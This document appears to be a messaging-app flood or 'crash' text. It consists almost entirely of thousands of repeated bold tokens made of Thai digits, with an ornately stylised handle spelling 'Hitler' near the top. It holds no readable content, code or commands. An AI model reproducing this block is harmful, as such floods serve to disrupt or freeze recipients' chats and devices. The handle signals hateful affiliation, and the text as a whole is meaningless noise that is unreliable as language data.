*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* 

@༻⃟ཱི༅࿗྄ེ✞ℳℜ྄ེ༝Hiͥ†lͣeͫrོ✞࿗྄ེ*

*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* 